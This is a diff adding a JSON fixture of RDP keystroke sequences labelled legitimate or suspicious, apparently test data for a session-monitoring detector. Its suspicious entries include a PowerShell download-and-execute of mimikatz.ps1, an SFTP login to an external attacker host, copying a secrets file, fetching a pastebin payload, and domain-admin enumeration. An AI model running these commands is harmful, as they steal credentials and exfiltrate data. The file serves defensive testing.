@@ -1,0 +1,21 @@
+{
+  "_doc": "RDP keystroke blocks. Each entry is [window_title, application, keystrokes]. Used for Windows-host sessions (legitimate vs. suspicious).",
+  "legitimate": [
+    ["Services", "services.msc", "[Tab][Tab]print spooler[Enter][Tab][Enter]"],
+    ["Event Viewer", "eventvwr.msc", "[Down][Down][Enter][Down][Enter]"],
+    ["Computer Management", "compmgmt.msc", "[Tab][Tab][Down][Enter]"],
+    ["Disk Management", "diskmgmt.msc", "[Tab]"],
+    ["Task Manager", "taskmgr.exe", "[Ctrl+Shift+Esc]"],
+    ["PowerShell", "powershell.exe", "Get-Service spooler[Enter]Restart-Service spooler[Enter]"],
+    ["File Explorer", "explorer.exe", "[F4]C:\\Windows\\System32\\drivers\\etc[Enter]"],
+    ["RegEdit", "regedit.exe", "HKLM\\SYSTEM\\CurrentControlSet\\Services[Enter]"],
+    ["Active Directory Users", "dsa.msc", "[F3]alice.chen[Enter]"]
+  ],
+  "suspicious": [
+    ["Notepad - secrets.txt", "notepad.exe", "[Ctrl+O]C:\\Users\\Public\\secrets.txt[Enter][Ctrl+A][Ctrl+C]"],
+    ["FileZilla - sftp://attacker@external.example.com", "filezilla.exe", "[Tab]attacker[Tab]hunter2[Enter]"],
+    ["Web Browser - https://pastebin.com/raw/abc123", "iexplore.exe", "https://pastebin.com/raw/abc123[Enter][Ctrl+S]"],
+    ["Command Prompt - net user", "cmd.exe", "net user /domain[Enter]net group \"domain admins\" /domain[Enter]"],
+    ["PowerShell - Mimikatz", "powershell.exe", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.50.99.42/mimikatz.ps1')[Enter]"]
+  ]
+}
